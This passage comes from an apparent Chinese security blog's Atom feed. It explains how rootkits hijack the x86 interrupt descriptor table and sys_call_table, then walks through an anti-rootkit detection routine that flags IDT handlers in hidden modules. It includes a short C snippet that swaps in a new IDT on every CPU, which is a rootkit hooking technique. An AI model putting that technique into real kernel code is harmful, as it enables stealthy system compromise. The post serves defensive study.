&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;idt_substitute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;desc_ptr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_idt_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cur_idt_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDT_SZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;idtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_idt_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;idtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idt_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;on_each_cpu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_load_idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cur_idt_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_idt_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;替换表的形式来完成劫持，其中对 IDTR 寄存器的操作使用 LIDT 指令和 SIDT 指令。另外 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_call_table&lt;/code&gt; 的 hook 应该方法也是类似，先在 IDT 表中找到 0x80 中断的位置，再根据特定 function 再 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_call_table&lt;/code&gt; 中的偏移…&lt;/p&gt;

&lt;p&gt;顺便贴一张 IDTR&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.it610.com%2Fimage%2Finfo9%2F3a4a1cf12b0940c3a8115008a28511bd.jpg&amp;amp;refer=http%3A%2F%2Fimg.it610.com&amp;amp;app=2002&amp;amp;size=f9999,10000&amp;amp;q=a80&amp;amp;n=0&amp;amp;g=0n&amp;amp;fmt=auto?sec=1650278847&amp;amp;t=cec7d575642e0f888777f63f0507bee7&quot; alt=&quot;百度&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在字节的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anti_rootkit&lt;/code&gt; 中我们截取 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;interrupt&lt;/code&gt; 检查部分，事实上 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_call_table&lt;/code&gt; 的检查部分也是一样的&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;analyze_interrupts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#ifdef CONFIG_X86
&lt;/span&gt;    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ckt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 遍历所有 entries&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDT_ENTRIES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mod_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

        &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ckt 判断是否为内核代码段&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ckt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;module_list_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// 获取 idt 对应函数的地址&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_module_from_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;mod_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// 寻找是否为隐藏的内核模块&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// 通过遍历 ksets 下的 mod list，通过于 kobj 一一比对&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// 如果找不到，则为隐藏的内核模块，是可疑的&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find_hidden_module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IS_ERR_OR_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;module_list_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;n&quot;&gt;mod_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;interrupts_print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mod_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;module_list_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这种检测，对函数的 entry 做了足够的检测，但是如何检测 hook 在函数中间的情况呢?&lt;/p&gt;

&lt;h2 id=&quot;最后&quot;&gt;最后&lt;/h2&gt;

&lt;p&gt;其实看的还是比较浅显的，如果每个模块都单独细钻，会耗费较大的时间，后续会慢慢跟进&lt;/p&gt;

&lt;h2 id=&quot;参考&quot;&gt;参考&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;有字节群中沈平推荐的两本，可以细细品读，我还没看…&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;1, The Rootkit Arsenal Escape and Evasion in the Dark Corners of the System by Bill Blunden， 2nd edition，第一版是中译本&lt;/p&gt;

&lt;p&gt;2, Rootkits and Bootkits Reversing Modern Malware and Next Generation Threats by Alex Matrosov, Eugene Rodionov, Sergey Bratus，有中译本&lt;/p&gt;

&lt;p&gt;3, &lt;a href=&quot;https://nskernel.gitbook.io/kernel-play-guide/hacking-interrupts-exceptions-and-trap-handlers/hooking-an-idt-handler&quot;&gt;nskernel-kernel-play-guide&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>从头开始的博客</title>
   <link href="https://chriskaliX.github.io/2022/03/18/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%8D%9A%E5%AE%A2"/>
   <updated>2022-03-18T00:00:00+01:00</updated>
   <id>https://chriskaliX.github.io/2022/03/18/从头开始的博客</id>
   <content type="html">&lt;h2 id=&quot;规划&quot;&gt;规划&lt;/h2&gt;

&lt;p&gt;后续长期做的方向，应该还是 HIDS/WAF 反入侵相关。当然也会涉及 Java/Golang 的一些安全开发，这里将记录我的一切~&lt;/p&gt;
</content>
 </entry>
 

</feed>
